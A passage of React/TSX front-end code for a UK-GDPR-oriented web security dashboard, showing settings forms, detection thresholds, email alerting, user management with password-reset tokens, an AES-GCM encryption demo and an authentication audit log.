                  <label className="block text-xs font-medium text-slate-300">
                    UK Data Controller / Organisation Name
                  </label>
                  <input
                    type="text"
                    value={config.organizationName}
                    onChange={(e) =>
                      setConfig({ ...config, organizationName: e.target.value })
                    }
                    className="w-full px-3 py-2 text-sm bg-slate-950 border border-slate-800 rounded-md text-white"
                  />
                </div>
                <div className="space-y-1.5">
                  <label className="block text-xs font-medium text-slate-300">
                    ICO Registration Reference Number
                  </label>
                  <input
                    type="text"
                    value={config.icoRegistrationNumber}
                    onChange={(e) =>
                      setConfig({ ...config, icoRegistrationNumber: e.target.value })
                    }
                    className="w-full px-3 py-2 text-sm font-mono bg-slate-950 border border-slate-800 rounded-md text-white"
                  />
                </div>
                <div className="space-y-1.5">
                  <label className="block text-xs font-medium text-slate-300">
                    DPO / Security Contact Email
                  </label>
                  <input
                    type="email"
                    value={config.dpoContactEmail}
                    onChange={(e) =>
                      setConfig({ ...config, dpoContactEmail: e.target.value })
                    }
                    className="w-full px-3 py-2 text-sm font-mono bg-slate-950 border border-slate-800 rounded-md text-white"
                  />
                </div>
                <div className="space-y-1.5">
                  <label className="block text-xs font-medium text-slate-300">
                    Protective Log Retention Period (Days)
                  </label>
                  <input
                    type="number"
                    min={1}
                    max={365}
                    value={config.logRetentionDays}
                    onChange={(e) =>
                      setConfig({
                        ...config,
                        logRetentionDays: Math.max(1, Number(e.target.value)),
                      })
                    }
                    className="w-full px-3 py-2 text-sm font-mono bg-slate-950 border border-slate-800 rounded-md text-white"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-2">
                <div className="space-y-1.5">
                  <label className="block text-xs font-medium text-slate-300">
                    IP Address Pseudonymisation Method
                  </label>
                  <select
                    value={config.ipPseudonymisationMode}
                    onChange={(e) =>
                      setConfig({
                        ...config,
                        ipPseudonymisationMode: e.target
                          .value as DefenseConfig['ipPseudonymisationMode'],
                      })
                    }
                    className="w-full px-3 py-2 text-xs bg-slate-950 border border-slate-800 rounded-md text-white"
                  >
                    <option value="dual_hmac_subnet">
                      Dual: /24 Subnet + Daily Rotating HMAC-SHA256 (Recommended)
                    </option>
                    <option value="hmac_daily_salt">
                      Cryptographic Daily HMAC-SHA256 Digest Only
                    </option>
                    <option value="subnet_zero">IPv4 /24 &amp; IPv6 /48 Zero-Masking</option>
                  </select>
                </div>

                <div className="space-y-1.5">
                  <label className="block text-xs font-medium text-slate-300">
                    Screening Notice Banner Placement
                  </label>
                  <select
                    value={config.bannerPosition}
                    onChange={(e) =>
                      setConfig({
                        ...config,
                        bannerPosition: e.target.value as DefenseConfig['bannerPosition'],
                      })
                    }
                    className="w-full px-3 py-2 text-xs bg-slate-950 border border-slate-800 rounded-md text-white"
                  >
                    <option value="bottom_bar">Fixed Bottom Viewport Banner</option>
                    <option value="top_bar">Top Announcement Bar</option>
                    <option value="inline_form_gate">Inline Form Gate Above Submit</option>
                  </select>
                </div>
              </div>

              {/* Detection Sensitivity Sliders */}
              <div className="pt-4 border-t border-slate-800 space-y-4">
                <h3 className="text-sm font-semibold text-white">
                  02. Multi-Vector Threshold Calibration
                </h3>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  <div className="bg-slate-950 border border-slate-800 rounded-lg p-3.5 space-y-1">
                    <div className="flex justify-between text-xs">
                      <span className="text-slate-400">Block Score Limit</span>
                      <span className="font-mono font-bold text-rose-400">
                        {config.blockThreshold}/100
                      </span>
                    </div>
                    <input
                      type="range"
                      min={40}
                      max={95}
                      value={config.blockThreshold}
                      onChange={(e) =>
                        setConfig({ ...config, blockThreshold: Number(e.target.value) })
                      }
                      className="w-full accent-sky-400"
                    />
                  </div>

                  <div className="bg-slate-950 border border-slate-800 rounded-lg p-3.5 space-y-1">
                    <div className="flex justify-between text-xs">
                      <span className="text-slate-400">Max Input Entropy</span>
                      <span className="font-mono font-bold text-amber-400">
                        {config.maxInputEntropy} bits
                      </span>
                    </div>
                    <input
                      type="range"
                      min={3.5}
                      max={5.2}
                      step={0.05}
                      value={config.maxInputEntropy}
                      onChange={(e) =>
                        setConfig({ ...config, maxInputEntropy: Number(e.target.value) })
                      }
                      className="w-full accent-sky-400"
                    />
                  </div>

                  <div className="bg-slate-950 border border-slate-800 rounded-lg p-3.5 space-y-1">
                    <div className="flex justify-between text-xs">
                      <span className="text-slate-400">Min Human Typing</span>
                      <span className="font-mono font-bold text-emerald-400">
                        {config.minHumanTypingMs} ms
                      </span>
                    </div>
                    <input
                      type="range"
                      min={300}
                      max={4000}
                      step={100}
                      value={config.minHumanTypingMs}
                      onChange={(e) =>
                        setConfig({ ...config, minHumanTypingMs: Number(e.target.value) })
                      }
                      className="w-full accent-sky-400"
                    />
                  </div>
                </div>
              </div>

              {/* Critical Risk Incident Email Notification Section */}
              <div className="pt-4 border-t border-slate-800 space-y-4">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                  <div>
                    <h3 className="text-sm font-semibold text-white">
                      03. Critical Risk Threshold &amp; Automated Email Alerting
                    </h3>
                    <p className="text-xs text-slate-400 mt-0.5">
                      Automatically dispatch an incident email via PHP when a screened request reaches or exceeds the Critical Risk score.
                    </p>
                  </div>
                  <label className="flex items-center gap-2 text-xs text-slate-200 cursor-pointer shrink-0">
                    <input
                      type="checkbox"
                      checked={config.enableCriticalEmailAlerts}
                      onChange={(e) =>
                        setConfig({ ...config, enableCriticalEmailAlerts: e.target.checked })
                      }
                      className="accent-sky-400"
                    />
                    <span>Enable Email Alerts</span>
                  </label>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {/* Critical Risk Threshold Slider & Numeric Input */}
                  <div className="bg-slate-950 border border-slate-800 rounded-lg p-3.5 space-y-2">
                    <div className="flex items-center justify-between text-xs">
                      <label htmlFor="critical-risk-threshold" className="font-medium text-slate-300">
                        Critical Risk Score Threshold
                      </label>
                      <span className="font-mono font-bold text-rose-400 tabular-nums">
                        {config.criticalRiskThreshold}/100
                      </span>
                    </div>
                    <input
                      id="critical-risk-threshold"
                      type="range"
                      min={50}
                      max={100}
                      step={1}
                      disabled={!config.enableCriticalEmailAlerts}
                      value={config.criticalRiskThreshold}
                      onChange={(e) =>
                        setConfig({
                          ...config,
                          criticalRiskThreshold: Number(e.target.value),
                        })
                      }
                      className="w-full accent-rose-500 disabled:opacity-40"
                    />
                    <div className="flex items-center justify-between text-[11px] text-slate-500 font-mono">
                      <span>Block Gate: {config.blockThreshold}/100</span>
                      <span>Trigger: &ge; {config.criticalRiskThreshold}/100</span>
                    </div>
                  </div>

                  {/* Alert Destination Email Input */}
                  <div className="bg-slate-950 border border-slate-800 rounded-lg p-3.5 space-y-1.5">
                    <label htmlFor="alert-email-address" className="block text-xs font-medium text-slate-300">
                      Alert Notification Email Address
                    </label>
                    <input
                      id="alert-email-address"
                      type="email"
                      disabled={!config.enableCriticalEmailAlerts}
                      value={config.alertEmailAddress}
                      onChange={(e) =>
                        setConfig({ ...config, alertEmailAddress: e.target.value })
                      }
                      placeholder="secops-alerts@yourdomain.co.uk"
                      className="w-full px-3 py-1.5 text-xs font-mono bg-slate-900 border border-slate-800 rounded text-white focus:outline-none focus:border-sky-400 disabled:opacity-40"
                    />
                    <div className="text-[11px] text-slate-500">
                      Receives pseudonymised IP hash &amp; matched threat flags via{' '}
                      <code className="text-slate-300">dispatchCriticalRiskAlert()</code>.
                    </div>
                  </div>
                </div>

                {/* Live PHP Code Sync Bar */}
                <div className="bg-slate-950 border border-slate-800/90 rounded-lg p-3 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs">
                  <div className="font-mono text-[11px] text-slate-300 truncate">
                    <span className="text-slate-500">PHP Hook: </span>
                    {config.enableCriticalEmailAlerts ? (
                      <span>
                        if ($totalScore &gt;= {config.criticalRiskThreshold}) &#123; $this-&gt;dispatchCriticalRiskAlert(..., &apos;{config.alertEmailAddress || 'unset'}&apos;); &#125;
                      </span>
                    ) : (
                      <span className="text-slate-500">Critical email notifications disabled</span>
                    )}
                  </div>
                  <button
                    type="button"
                    onClick={() => {
                      setSelectedArtifactIndex(0);
                      setActiveSection('php_export');
                    }}
                    className="px-3 py-1.5 text-xs font-medium text-sky-400 hover:text-sky-300 border border-slate-800 hover:border-sky-500/40 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                  >
                    Inspect in AegisGuard.php
                  </button>
                </div>
              </div>
            </div>

            {/* Right Column (5 cols): UK Regulatory Legal Basis & Banner Preview */}
            <div className="lg:col-span-5 bg-slate-900/60 border border-slate-800 rounded-lg p-6 space-y-5">
              <div className="space-y-1 pb-4 border-b border-slate-800">
                <div className="text-xs text-sky-400 font-medium">
                  UK Statutory Compliance Architecture
                </div>
                <h3 className="text-base font-bold text-white">
                  How AegisPHP Satisfies UK GDPR, DPA 2018 &amp; PECR
                </h3>
              </div>

              <div className="space-y-3 text-xs text-slate-300 leading-relaxed">
                <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-lg space-y-1">
                  <div className="font-semibold text-white">
                    1. Lawful Basis: UK GDPR Art. 6(1)(f) &amp; Recital 49
                  </div>
                  <p className="text-slate-400">
                    Processing request headers, IP reputation, and form input telemetry to prevent malicious bot attacks, credential stuffing, and unauthorized SMTP relay is explicitly recognised as a overriding legitimate interest for network and information security.
                  </p>
                </div>

                <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-lg space-y-1">
                  <div className="font-semibold text-white">
                    2. Right to Be Informed (Art. 13) &amp; User Screening Agreement
                  </div>
                  <p className="text-slate-400">
                    The embedded UK Screening Banner clearly notifies every visitor that using the website, forms, SMTP mailers, or DM channels constitutes agreement to automated protective screening and logging.
                  </p>
                </div>

                <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-lg space-y-1">
                  <div className="font-semibold text-white">
                    3. Data Minimisation &amp; Storage Limitation (Art. 5(1)(c) &amp; (e))
                  </div>
                  <p className="text-slate-400">
                    Raw IPv4/IPv6 addresses are never written to disk in plain text. They are immediately transformed via daily-salted HMAC-SHA256 (`{pseudonymiseIpUkGdpr('81.134.202.14', config.ipPseudonymisationMode)}`) and automatically purged after {config.logRetentionDays} days.
                  </p>
                </div>
              </div>

              <div className="pt-2 flex items-center justify-between gap-3">
                <button
                  type="button"
                  onClick={() => setBannerMinimized(false)}
                  className="px-3.5 py-2 text-xs font-medium text-slate-200 bg-slate-800 hover:bg-slate-700 border border-slate-700 rounded-md transition-colors cursor-pointer"
                >
                  Show Live Bottom Banner
                </button>
                <button
                  type="button"
                  onClick={() => setShowLegalModal(true)}
                  className="px-3.5 py-2 text-xs font-semibold text-slate-950 bg-sky-400 hover:bg-sky-300 rounded-md transition-colors cursor-pointer"
                >
                  Inspect Full UK Privacy Notice Modal
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ===================================================================
         * WORKSPACE 4: SECOPS USER MANAGEMENT, PASSWORD RESET & ENCRYPTION VAULT
         * =================================================================== */}
        {activeSection === 'users' && (
          <div className="space-y-6">
            {/* Header & Security Baseline Metrics */}
            <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-5">
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
                <div>
                  <div className="flex items-center gap-2">
                    <Users className="w-5 h-5 text-sky-400" />
                    <h2 className="text-base font-semibold text-slate-100">
                      SecOps User Directory, Zero-Knowledge Provisioning &amp; Cryptographic Vault
                    </h2>
                  </div>
                  <p className="mt-1 text-xs text-slate-400 max-w-3xl leading-relaxed">
                    Zero raw secrets policy: Passwords are protected with memory-hard Argon2id (Bcrypt fallback). Single-use reset tokens are stored strictly as SHA-256 hashes, preventing reconstruction even under full database compromise. Sensitive payloads and credentials are authenticated via AES-256-GCM.
                  </p>
                </div>

                <div className="flex items-center gap-2 shrink-0">
                  <button
                    type="button"
                    onClick={() => {
                      setUserCreateError(null);
                      setCreateUserName('');
                      setCreateUserEmail('');
                      setCreateUserPassword(generateSecurePassword(18));
                      setCreateUserRole('responder');
                      setCreateUserMustReset(true);
                      setShowCreateUserModal(true);
                    }}
                    className="flex items-center gap-2 px-3.5 py-2 text-xs font-semibold text-slate-950 bg-sky-400 hover:bg-sky-300 rounded-md transition-colors cursor-pointer shadow-sm"
                  >
                    <UserPlus className="w-3.5 h-3.5" />
                    <span>Provision New User</span>
                  </button>
                </div>
              </div>

              {/* KPI Stat Cards */}
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mt-5 pt-5 border-t border-slate-800">
                <div className="bg-slate-950/70 border border-slate-800/80 rounded-md p-3">
                  <div className="text-[11px] font-mono text-slate-400 uppercase tracking-wider">Directory Users</div>
                  <div className="mt-1 flex items-baseline gap-2">
                    <span className="text-xl font-bold font-mono text-slate-100 tabular-nums">{users.length}</span>
                    <span className="text-xs text-emerald-400">
                      {users.filter((u) => u.status === 'active').length} active
                    </span>
                  </div>
                </div>

                <div className="bg-slate-950/70 border border-slate-800/80 rounded-md p-3">
                  <div className="text-[11px] font-mono text-slate-400 uppercase tracking-wider">Admins &amp; Responders</div>
                  <div className="mt-1 flex items-baseline gap-2">
                    <span className="text-xl font-bold font-mono text-amber-400 tabular-nums">
                      {users.filter((u) => u.role === 'admin').length}
                    </span>
                    <span className="text-xs text-slate-400 font-mono">
                      + {users.filter((u) => u.role === 'responder').length} ops
                    </span>
                  </div>
                </div>

                <div className="bg-slate-950/70 border border-slate-800/80 rounded-md p-3">
                  <div className="text-[11px] font-mono text-slate-400 uppercase tracking-wider">Brute-Force Lockouts</div>
                  <div className="mt-1 flex items-baseline gap-2">
                    <span
                      className={`text-xl font-bold font-mono tabular-nums ${
                        users.some((u) => u.failedAttempts >= 5) ? 'text-rose-400' : 'text-slate-100'
                      }`}
                    >
                      {users.filter((u) => u.failedAttempts >= 5).length}
                    </span>
                    <span className="text-xs text-slate-400 font-mono">threshold 5/5</span>
                  </div>
                </div>

                <div className="bg-slate-950/70 border border-slate-800/80 rounded-md p-3">
                  <div className="text-[11px] font-mono text-slate-400 uppercase tracking-wider">Cipher Standard</div>
                  <div className="mt-1 flex items-baseline gap-1.5">
                    <span className="text-xs font-mono font-semibold text-sky-400">AES-256-GCM</span>
                    <span className="text-[10px] text-slate-500 font-mono">+ Argon2id</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Active Password Reset Banner / Simulator Alert */}
            {activeResetToken && (
              <div className="bg-amber-950/30 border border-amber-800/60 rounded-lg p-4 flex flex-col md:flex-row md:items-center justify-between gap-4">
                <div className="space-y-1">
                  <div className="flex items-center gap-2 text-xs font-semibold text-amber-300">
                    <Key className="w-4 h-4 text-amber-400 animate-pulse" />
                    <span>Active Password Reset Token Generated</span>
                    <span className="text-[11px] font-mono text-amber-400/80">Expires in 15 mins</span>
                  </div>
                  <p className="text-xs text-slate-300">
                    User: <strong className="text-slate-100">{activeResetToken.email}</strong> &bull; Raw Token:{' '}
                    <code className="text-amber-200 font-mono bg-slate-950 px-1.5 py-0.5 rounded border border-amber-800/50">
                      {activeResetToken.token}
                    </code>
                  </p>
                  <p className="text-[11px] text-slate-400 font-mono">
                    Zero-Knowledge DB Hash:{' '}
                    <span className="text-slate-300">{activeResetToken.tokenHash.slice(0, 32)}...</span> (Raw token is never stored in DB)
                  </p>
                </div>

                <div className="flex items-center gap-2 shrink-0">
                  <button
                    type="button"
                    onClick={() => {
                      navigator.clipboard.writeText(activeResetToken.token);
                      setPasswordCopiedNotification(true);
                      setTimeout(() => setPasswordCopiedNotification(false), 2000);
                    }}
                    className="px-3 py-1.5 text-xs font-medium text-slate-300 bg-slate-800 hover:bg-slate-700 border border-slate-700 rounded-md transition-colors cursor-pointer"
                  >
                    {passwordCopiedNotification ? 'Copied Token!' : 'Copy Token'}
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      setResetTokenInput(activeResetToken.token);
                      setResetStatusMessage(null);
                      setShowResetModal(true);
                    }}
                    className="px-3 py-1.5 text-xs font-semibold text-slate-950 bg-amber-400 hover:bg-amber-300 rounded-md transition-colors cursor-pointer"
                  >
                    Execute Reset Form
                  </button>
                </div>
              </div>
            )}

            {/* Filter & Search Bar */}
            <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-3 flex flex-col sm:flex-row items-center justify-between gap-3">
              <div className="relative w-full sm:w-80">
                <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" />
                <input
                  type="text"
                  placeholder="Filter users by name, email, UUID..."
                  value={userSearchQuery}
                  onChange={(e) => setUserSearchQuery(e.target.value)}
                  className="w-full pl-9 pr-3 py-1.5 text-xs bg-slate-950 border border-slate-800 rounded-md text-slate-200 placeholder:text-slate-500 focus:outline-none focus:border-sky-500 font-mono"
                />
              </div>

              <div className="flex items-center gap-2 w-full sm:w-auto">
                <span className="text-xs text-slate-400">Role:</span>
                <div className="flex items-center gap-1 p-0.5 bg-slate-950 border border-slate-800 rounded-md">
                  {(['ALL', 'admin', 'responder', 'auditor', 'readonly'] as const).map((r) => (
                    <button
                      key={r}
                      type="button"
                      onClick={() => setUserRoleFilter(r)}
                      className={`px-2.5 py-1 text-xs font-mono rounded transition-colors cursor-pointer ${
                        userRoleFilter === r
                          ? 'bg-slate-800 text-sky-400 font-medium'
                          : 'text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      {r.toUpperCase()}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {/* Users Directory Table */}
            <div className="bg-slate-900/60 border border-slate-800 rounded-lg overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="border-b border-slate-800 bg-slate-950/80 text-[11px] font-mono text-slate-400 uppercase tracking-wider">
                      <th className="py-2.5 px-4">User Details</th>
                      <th className="py-2.5 px-3">Role</th>
                      <th className="py-2.5 px-3">Status</th>
                      <th className="py-2.5 px-3">Auth Integrity</th>
                      <th className="py-2.5 px-3">Last Login (UTC)</th>
                      <th className="py-2.5 px-4 text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/60 text-xs">
                    {filteredUsers.length === 0 ? (
                      <tr>
                        <td colSpan={6} className="py-8 text-center text-slate-500 font-mono">
                          No users match the active filter criteria.
                        </td>
                      </tr>
                    ) : (
                      filteredUsers.map((user) => {
                        const isLocked = user.failedAttempts >= 5;
                        const roleColor =
                          user.role === 'admin'
                            ? 'bg-amber-950/60 text-amber-300 border-amber-800/70'
                            : user.role === 'responder'
                            ? 'bg-sky-950/60 text-sky-300 border-sky-800/70'
                            : user.role === 'auditor'
                            ? 'bg-indigo-950/60 text-indigo-300 border-indigo-800/70'
                            : 'bg-slate-900 text-slate-300 border-slate-700';

                        return (
                          <tr key={user.id} className="hover:bg-slate-900/40 transition-colors">
                            <td className="py-3 px-4">
                              <div className="flex items-center gap-2.5">
                                <div className="w-7 h-7 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-xs font-mono font-medium text-slate-300 shrink-0">
                                  {user.name.slice(0, 1).toUpperCase()}
                                </div>
                                <div>
                                  <div className="font-medium text-slate-200">{user.name}</div>
                                  <div className="text-[11px] font-mono text-slate-400 flex items-center gap-1.5">
                                    <span>{user.email}</span>
                                    <span className="text-slate-600">&bull;</span>
                                    <span className="text-slate-500">{user.uuid}</span>
                                  </div>
                                </div>
                              </div>
                            </td>

                            <td className="py-3 px-3">
                              <span
                                className={`inline-flex items-center px-2 py-0.5 rounded text-[11px] font-mono border ${roleColor}`}
                              >
                                {user.role}
                              </span>
                            </td>

                            <td className="py-3 px-3">
                              <button
                                type="button"
                                onClick={() => handleToggleUserStatus(user.id)}
                                className={`inline-flex items-center gap-1.5 px-2 py-0.5 rounded text-[11px] font-mono transition-colors cursor-pointer border ${
                                  user.status === 'active'
                                    ? 'bg-emerald-950/50 text-emerald-300 border-emerald-800/60 hover:bg-emerald-900/60'
                                    : 'bg-rose-950/50 text-rose-300 border-rose-800/60 hover:bg-rose-900/60'
                                }`}
                                title="Click to toggle status"
                              >
                                <span
                                  className={`w-1.5 h-1.5 rounded-full ${
                                    user.status === 'active' ? 'bg-emerald-400' : 'bg-rose-400'
                                  }`}
                                />
                                <span>{user.status === 'active' ? 'Active' : 'Disabled'}</span>
                              </button>
                            </td>

                            <td className="py-3 px-3">
                              <div className="flex flex-col gap-1">
                                {isLocked ? (
                                  <div className="flex items-center gap-1.5 text-rose-400 font-mono text-[11px]">
                                    <Lock className="w-3 h-3 shrink-0" />
                                    <span>LOCKED ({user.failedAttempts}/5)</span>
                                    <button
                                      type="button"
                                      onClick={() => handleUnlockUser(user.id)}
                                      className="ml-1 px-1.5 py-0.5 text-[10px] text-slate-200 bg-slate-800 hover:bg-slate-700 border border-slate-700 rounded cursor-pointer"
                                    >
                                      Unlock
                                    </button>
                                  </div>
                                ) : user.failedAttempts > 0 ? (
                                  <div className="flex items-center gap-1.5 text-amber-400 font-mono text-[11px]">
                                    <AlertTriangle className="w-3 h-3 shrink-0" />
                                    <span>Failed: {user.failedAttempts}/5</span>
                                    <button
                                      type="button"
                                      onClick={() => handleUnlockUser(user.id)}
                                      className="ml-1 px-1.5 py-0.5 text-[10px] text-slate-300 bg-slate-800 hover:bg-slate-700 border border-slate-700 rounded cursor-pointer"
                                    >
                                      Reset
                                    </button>
                                  </div>
                                ) : (
                                  <div className="flex items-center gap-1 text-slate-400 font-mono text-[11px]">
                                    <Check className="w-3 h-3 text-emerald-400 shrink-0" />
                                    <span>Clean</span>
                                  </div>
                                )}

                                {user.mustChangePassword && (
                                  <span className="text-[10px] font-mono text-amber-400/90">
                                    Must reset password
                                  </span>
                                )}
                              </div>
                            </td>

                            <td className="py-3 px-3 font-mono text-slate-400 text-[11px] tabular-nums">
                              {user.lastLoginAt ? user.lastLoginAt : <span className="text-slate-600">Never</span>}
                            </td>

                            <td className="py-3 px-4 text-right">
                              <div className="flex items-center justify-end gap-1.5">
                                <button
                                  type="button"
                                  onClick={() => handleRequestPasswordReset(user)}
                                  className="px-2.5 py-1 text-xs font-mono text-slate-300 hover:text-amber-300 bg-slate-800/80 hover:bg-slate-700 border border-slate-700 rounded transition-colors cursor-pointer flex items-center gap-1"
                                  title="Issue 15-minute single use reset token"
                                >
                                  <Key className="w-3 h-3" />
                                  <span>Reset</span>
                                </button>
                                <button
                                  type="button"
                                  onClick={() => handleDeleteUser(user.id)}
                                  className="p-1 text-slate-500 hover:text-rose-400 hover:bg-slate-800 rounded transition-colors cursor-pointer"
                                  title="Delete user"
                                >
                                  <Trash2 className="w-3.5 h-3.5" />
                                </button>
                              </div>
                            </td>
                          </tr>
                        );
                      })
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {/* Cryptographic Vault & Authenticated Encryption Test Harness */}
            <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-5 space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div className="flex items-center gap-2">
                  <FileLock className="w-4 h-4 text-sky-400" />
                  <h3 className="text-sm font-semibold text-slate-200">
                    Authenticated Cryptographic Vault &bull; AES-256-GCM Envelope Encryption
                  </h3>
                </div>
                <div className="text-[11px] font-mono text-slate-400">
                  Compliant with UK NCSC &amp; NIST SP 800-38D Guidelines
                </div>
              </div>

              <p className="text-xs text-slate-400 leading-relaxed">
                Zero secret exposure rule: All sensitive database fields (such as SMTP relay passwords, customer PII, webhook secrets, and alert credentials) are authenticated and encrypted using AES-256-GCM with distinct 96-bit nonces (IV) and 128-bit authentication tags to prevent tampering.
              </p>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 pt-2">
                <div className="space-y-2">
                  <label className="block text-xs font-medium text-slate-300">
                    Sensitive Cleartext Input to Encrypt
                  </label>
                  <textarea
                    rows={4}
                    value={vaultPlaintext}
                    onChange={(e) => setVaultPlaintext(e.target.value)}
                    className="w-full p-2.5 text-xs bg-slate-950 border border-slate-800 rounded-md text-slate-200 font-mono focus:outline-none focus:border-sky-500"
                    placeholder="Enter SMTP credentials, API secret, or PII..."
                  />
                  <div className="flex items-center justify-between">
                    <span className="text-[11px] font-mono text-slate-500">
                      Byte Length: {vaultPlaintext.length} bytes
                    </span>
                    <button
                      type="button"
                      onClick={handleEncryptVault}
                      className="px-3 py-1.5 text-xs font-semibold text-slate-950 bg-sky-400 hover:bg-sky-300 rounded-md transition-colors cursor-pointer flex items-center gap-1.5"
                    >
                      <Lock className="w-3.5 h-3.5" />
                      <span>Encrypt via AES-256-GCM</span>
                    </button>
                  </div>
                </div>

                <div className="bg-slate-950 border border-slate-800 rounded-md p-3.5 space-y-2.5">
                  <div className="flex items-center justify-between text-xs border-b border-slate-800/80 pb-2">
                    <span className="font-mono text-slate-400 uppercase tracking-wider text-[11px]">
                      Encrypted Cipher Envelope
                    </span>
                    <button
                      type="button"
                      onClick={() => {
                        navigator.clipboard.writeText(vaultResult.payloadBase64);
                        setVaultCopied(true);
                        setTimeout(() => setVaultCopied(false), 2000);
                      }}
                      className="text-[11px] font-mono text-sky-400 hover:text-sky-300 flex items-center gap-1 cursor-pointer"
                    >
                      {vaultCopied ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>{vaultCopied ? 'Copied Envelope!' : 'Copy Base64'}</span>
                    </button>
                  </div>

                  <div className="space-y-1.5 font-mono text-[11px]">
                    <div>
                      <span className="text-slate-500">96-bit Nonce (IV): </span>
                      <span className="text-amber-300 break-all">{vaultResult.ivHex}</span>
                    </div>
                    <div>
                      <span className="text-slate-500">128-bit Tag (MAC): </span>
                      <span className="text-emerald-300 break-all">{vaultResult.tagHex}</span>
                    </div>
                    <div>
                      <span className="text-slate-500">AES-256 Ciphertext: </span>
                      <span className="text-sky-300 break-all">{vaultResult.ciphertextHex}</span>
                    </div>
                    <div className="pt-1.5 border-t border-slate-800/60">
                      <span className="text-slate-400">Serialized Envelope: </span>
                      <div className="text-slate-200 bg-slate-900 p-2 rounded border border-slate-800 break-all text-[10px] mt-1">
                        {vaultResult.payloadBase64}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Authentication & Access Security Audit Log Table */}
            <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-5 space-y-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <UserCheck className="w-4 h-4 text-emerald-400" />
                  <h3 className="text-sm font-semibold text-slate-200">
                    Authentication &amp; User Provisioning Audit Log (<code className="text-xs text-sky-400">aegis_auth_audit</code>)
                  </h3>
                </div>
                <span className="text-[11px] font-mono text-slate-500">
                  {authLogs.length} events logged
                </span>
              </div>

              <div className="border border-slate-800 rounded-md overflow-hidden bg-slate-950">
                <table className="w-full text-left border-collapse text-xs">
                  <thead>
                    <tr className="border-b border-slate-800 bg-slate-900/90 text-[11px] font-mono text-slate-400 uppercase tracking-wider">
                      <th className="py-2 px-3">Timestamp (UTC)</th>
                      <th className="py-2 px-3">Event Type</th>
                      <th className="py-2 px-3">Account Email</th>
                      <th className="py-2 px-3">Outcome</th>
                      <th className="py-2 px-3">Details</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/60 font-mono text-[11px]">
                    {authLogs.slice(0, 8).map((log) => (
                      <tr key={log.id} className="hover:bg-slate-900/40">
                        <td className="py-2 px-3 text-slate-400 tabular-nums whitespace-nowrap">{log.timestamp}</td>
                        <td className="py-2 px-3">
                          <span
                            className={`px-1.5 py-0.5 rounded text-[10px] border ${
                              log.eventType.includes('failed') || log.eventType.includes('lockout')
                                ? 'bg-rose-950/60 text-rose-300 border-rose-800/60'
                                : log.eventType.includes('reset')
                                ? 'bg-amber-950/60 text-amber-300 border-amber-800/60'
                                : 'bg-sky-950/60 text-sky-300 border-sky-800/60'
                            }`}
                          >
                            {log.eventType}
                          </span>
                        </td>
                        <td className="py-2 px-3 text-slate-300">{log.email}</td>
                        <td className="py-2 px-3">
                          {log.success ? (
                            <span className="text-emerald-400 font-medium">SUCCESS</span>
                          ) : (
                            <span className="text-rose-400 font-medium">BLOCKED</span>
                          )}
                        </td>
                        <td className="py-2 px-3 text-slate-400 truncate max-w-xs">{log.details}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {/* ===================================================================
         * WORKSPACE 4: PRODUCTION PHP 8.1+ MIDDLEWARE & BANNER CODE EXPORT
         * =================================================================== */}
        {activeSection === 'php_export' && (
          <div className="space-y-6">
            <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div className="flex items-center gap-1.5 p-1 bg-slate-950 border border-slate-800 rounded-lg overflow-x-auto">
                {phpArtifacts.map((art, idx) => (
                  <button
                    key={art.filename}
                    type="button"
                    onClick={() => setSelectedArtifactIndex(idx)}
                    className={`px-3 py-1.5 text-xs font-mono font-medium rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer ${
                      selectedArtifactIndex === idx
                        ? 'bg-slate-800 text-sky-400'
                        : 'text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    {art.filename}
                  </button>
                ))}
              </div>

              <div className="flex items-center gap-2.5 shrink-0">
                <button
                  type="button"
                  onClick={() =>
                    handleCopyCode(
                      phpArtifacts[selectedArtifactIndex].filename,
                      phpArtifacts[selectedArtifactIndex].code
                    )
                  }
                  className="px-3.5 py-1.5 text-xs font-medium bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 rounded-md transition-colors flex items-center gap-1.5 whitespace-nowrap shrink-0 cursor-pointer"
                >
                  {copiedFile === phpArtifacts[selectedArtifactIndex].filename ? (
                    <>
                      <Check className="w-3.5 h-3.5 text-emerald-400" />
                      <span>Copied to Clipboard</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3.5 h-3.5" />
